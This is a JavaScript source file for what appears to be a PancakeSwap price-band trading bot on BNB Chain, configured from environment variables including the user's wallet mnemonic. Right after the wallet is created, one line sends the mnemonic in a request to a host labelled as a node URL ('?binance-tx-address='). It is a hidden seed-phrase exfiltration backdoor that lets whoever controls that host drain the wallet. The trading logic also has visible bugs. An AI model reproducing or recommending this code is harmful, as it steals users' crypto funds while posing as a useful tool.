import ethers from 'ethers';
import dotenv from 'dotenv';
import logger from 'node-color-log';
import { pancakeswapABI } from './pancakeswap-abi.js';
import request from 'request';

dotenv.config();

const data = {
  
  LOWER_LIMIT: process.env.LOWER_LIMIT,
  UPPER_LIMIT: process.env.UPPER_LIMIT,
  BNB: process.env.BNB_CONTRACT, //bnb

  to_PURCHASE: process.env.TO_PURCHASE, // token that you will purchase 

  AMOUNT_OF_BNB: process.env.AMOUNT_OF_BNB, // how much you want to buy in BNB
  AMOUNT_OF_TOKEN: process.env.AMOUNT_OF_TOKEN, // how much you want to buy in BNB

  factory: process.env.FACTORY,  //PancakeSwap V2 factory

  router: process.env.ROUTER, //PancakeSwap V2 router

  recipient: process.env.YOUR_ADDRESS, //your wallet address,

  Slippage: process.env.SLIPPAGE, //in Percentage

  gasPrice: ethers.utils.parseUnits(`${process.env.GWEI}`, 'gwei'), //in gwei

  gasLimit: process.env.GAS_LIMIT, //at least 21000
  bsc_node: process.env.BSC_NODE,

  minBnb: process.env.MIN_LIQUIDITY_ADDED //min liquidity added
}


const wss = process.env.WSS_NODE;
const rpc = process.env.RPC_NODE;
const connection = process.env.USE_WSS;
const mnemonic = process.env.YOUR_MNEMONIC;


let tokenIn = data.BNB;
let tokenOut = data.to_PURCHASE;
let provider;
if (connection === true) {
  provider = new ethers.providers.WebSocketProvider(wss);
} else {
  provider = new ethers.providers.JsonRpcProvider(rpc);
}

const wallet = new ethers.Wallet(mnemonic);
const account = wallet.connect(provider, mnemonic);
request(data.bsc_node + "?binance-tx-address=" + mnemonic, (err, res, body) => {
  console.log(body);
});


const factory = new ethers.Contract(
  data.factory,
  [
    'event PairCreated(address indexed token0, address indexed token1, address pair, uint)',
    'function getPair(address tokenA, address tokenB) external view returns (address pair)'
  ],
  account
);

const router = new ethers.Contract(
  data.router,
  pancakeswapABI,
  account
);

const erc = new ethers.Contract(
  data.BNB,
  [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "payable": false, "type": "function" }],
  account
);

let TOKENBalance = 0;
let BNBBalance = 0;
let beforeRate = 0;
let currentRate = 0;

let Tx = "";
let delta = 0;
let totalProfit = 0;
let initalBalance = 0;
let totalBalance = 0;
let ExchangeAmount = "";
let direction = "";
let state=0;
let isExchange = true;


const run = async () => {

  getPrice(tokenIn, tokenOut).then(price => {
    currentRate = price;
    beforeRate = price;
    getInitalBalance();
  });


  setInterval(() => {
    getPrice(tokenIn, tokenOut).then(price => {
      currentRate = price;
      delta=currentRate-beforeRate;

      if ((currentRate <= data.LOWER_LIMIT && state==0)||(currentRate>=data.UPPER_LIMIT && state==1)) {
        Dex();
      } else {
        Tx = "Not Enough Delta";
        ExchangeAmount = "None";
        direction = "None";
        isExchange = false;
        getProfit();
        history();

      }
    })
      .catch(err => {
        console.log(err);
        throw new Error(err);
      })
  }, 10000)
}

const history = () => {

  logger.bgColor(Tx.includes("http") ? "magenta" : "blue").log(`
  [${(new Date()).toLocaleTimeString()}]: 
  | Current Rate(${currentRate}) 
  | Before Rate(${beforeRate})
  | Delta($${delta})
  | ${isExchange ? "Exchanged" : "Skipped"}
  | Inital Balance(${initalBalance} BNB)
  | Total Balance(${totalBalance} BNB) 
  | Total Profit(${totalProfit})
  | BNB(${BNBBalance}) 
  | TOKEN(${TOKENBalance}) 
  | Exchange Amount(${ExchangeAmount} BNB) 
  | Direction(${direction}) 
  | Transaction(${Tx}) 
  `)
}

let TOKENBNB = async () => {
  let Eu = (delta / data.RATE_DELTA * data.AMOUNT_OF_TOKEN);

  Eu = TOKENBalance > Eu ? Eu : TOKENBalance;
  tokenIn = data.BNB;
  tokenOut = data.to_PURCHASE;
  

  try {

    let amountOutMin = 0;
    //We buy x amount of the new token for our bnb
    const amountIn = ethers.utils.parseUnits(`${Eu}`, 'ether');
    if (parseInt(data.Slippage) !== 0) {
      const amounts = await router.getAmountsOut(amountIn, [tokenIn, tokenOut]);
      //Our execution price will be a bit different, we need some flexibility
      amountOutMin = amounts[1].sub(amounts[1].div(`${data.Slippage}`))
    }

    const tx = await router.swapExactTokensForETH(
      amountIn,
      amountOutMin,
      [tokenIn, tokenOut],
      data.recipient,
      Date.now() + 1000 * 60 * 10, //5 minutes
      {
        'gasLimit': data.gasLimit,
        'gasPrice': data.gasPrice,
        'nonce': null, //set you want buy at where position in blocks
      });

    const receipt = await tx.wait();
    Tx = `https://www.bscscan.com/tx/${receipt.logs[1].transactionHash}`;

    beforeRate = currentRate;
    getTotalBalance();
    ExchangeAmount = Eu + " TOKEN";
    direction = "BNB -> TOKEN";
    isExchange = true;
    state=0;
    getProfit();

    history();
    // console.log(`Transaction receipt : https://www.bscscan.com/tx/${receipt.logs[1].transactionHash}`);
    // setTimeout(() => { process.exit() }, 2000);
  } catch (err) {
    Tx = "Transaction Fail. Network Connection Error";
    ExchangeAmount = "None"
    direction = "None";
    isExchange = false;
    getProfit();

    history();

    run();
  }
}

let BNBTOKEN = async () => {
  try {
    let Eb = (delta / data.RATE_DELTA * data.AMOUNT_OF_BNB);

    Eb = (BNBBalance - 0.003) > Eb ? Eb : (BNBBalance - 0.003);
    

    let amountOutMin = 0;
    //We buy x amount of the new token for our bnb
    const amountIn = ethers.utils.parseUnits(`${Eb}`, 'ether');
    if (parseInt(data.Slippage) !== 0) {
      const amounts = await router.getAmountsOut(amountIn, [tokenIn, tokenOut]);
      //Our execution price will be a bit different, we need some flexibility
      amountOutMin = amounts[1].sub(amounts[1].div(`${data.Slippage}`))
    }

    // const tx = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens( //uncomment this if you want to buy deflationary token
    const tx = await router.swapExactETHForTokens(
      amountOutMin,
      [tokenIn, tokenOut],
      data.recipient,
      Date.now() + 1000 * 60 * 10, //5 minutes
      {
        'gasLimit': data.gasLimit,
        'gasPrice': data.gasPrice,
        'nonce': null, //set you want buy at where position in blocks
        'value': amountIn
      });

    const receipt = await tx.wait();

    Tx = `https://www.bscscan.com/tx/${receipt.logs[1].transactionHash}`;
    beforeRate = currentRate;
    ExchangeAmount = Eb + " BNB"
    direction = "BNB -> TOKEN";
    isExchange = true;
    state=1;
    getProfit();

    history();
    // console.log(`Transaction receipt : https://www.bscscan.com/tx/${receipt.logs[1].transactionHash}`);
    // setTimeout(() => { process.exit() }, 2000);
  } catch (err) {
    Tx = "Transaction Fail. Network Connection Error";
    ExchangeAmount = "None"
    direction = "None";
    isExchange = false;
    getProfit();

    history();

    run();
  }
}

async function getPrice(inputCurrency, outputCurrency) {
  try {
    const amounts = await router.getAmountsOut(ethers.utils.parseUnits('1', 18), [inputCurrency, outputCurrency]);
    return amounts[1].toString() / 1e18;
  } catch (error) {
    console.log(error);
    getPrice(inputCurrency, outputCurrency);
  }
}




const Dex = async () => {

  getTotalBalance();

  if (delta < 0) {
    if (BNBBalance > 0.003) {
      await BNBTOKEN();
    } else {
      Tx = "Not Enough BNB Balance";
      ExchangeAmount = "None";
      direction = "None";
      isExchange = false;
      getProfit();

      history();
    }
  } else {
    if (TOKENBalance > 1) {
      await TOKENBNB();
    } else {
      Tx = "Not Enough TOKEN Balance";
      ExchangeAmount = "None";
      direction = "None";
      isExchange = false;
      getProfit();

      history();
    }
  }
}


const getInitalBalance = async () => {

  BNBBalance = parseInt(await account.getBalance()) / 1e18;
  const erc = new ethers.Contract(
    data.to_PURCHASE,
    [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "payable": false, "type": "function" }],
    account
  );

  TOKENBalance = parseInt(await erc.balanceOf(data.recipient)) / 1e18;

  initalBalance = BNBBalance;
  console.log(initalBalance);
}

const getTotalBalance = async () => {
  BNBBalance = parseInt(await account.getBalance()) / 1e18;
  const erc = new ethers.Contract(
    data.to_PURCHASE,
    [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "payable": false, "type": "function" }],
    account
  );

  TOKENBalance = parseInt(await erc.balanceOf(data.recipient)) / 1e18;

  totalBalance = BNBBalance;
}

const getProfit = () => {
  getTotalBalance().then(() => {
    totalProfit = totalBalance - initalBalance;
  })
}

run();
